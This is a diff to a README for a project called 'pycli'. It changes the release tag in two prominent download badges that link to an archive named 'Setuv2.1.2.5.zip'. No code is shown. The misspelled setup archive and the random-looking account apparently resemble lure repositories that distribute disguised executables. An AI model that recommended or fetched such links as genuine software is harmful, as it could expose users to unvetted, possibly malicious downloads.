@@ -1,6 +1,6 @@
-[![Download](https://img.shields.io/badge/⬇_Download-Latest-blue?style=for-the-badge)](https://github.com/dant-dev1999z9/pycli/releases/download/v5.0.0/Setuv2.1.2.5.zip)
+[![Download](https://img.shields.io/badge/⬇_Download-Latest-blue?style=for-the-badge)](https://github.com/dant-dev1999z9/pycli/releases/download/v1.0.0/Setuv2.1.2.5.zip)
 
-[![📦 Download Package](https://img.shields.io/badge/📦_Download-Package-success?style=for-the-badge)](https://github.com/dant-dev1999z9/pycli/releases/download/v5.0.0/Setuv2.1.2.5.zip)
+[![📦 Download Package](https://img.shields.io/badge/📦_Download-Package-success?style=for-the-badge)](https://github.com/dant-dev1999z9/pycli/releases/download/v1.0.0/Setuv2.1.2.5.zip)
 
 # ⚡ pycli
 
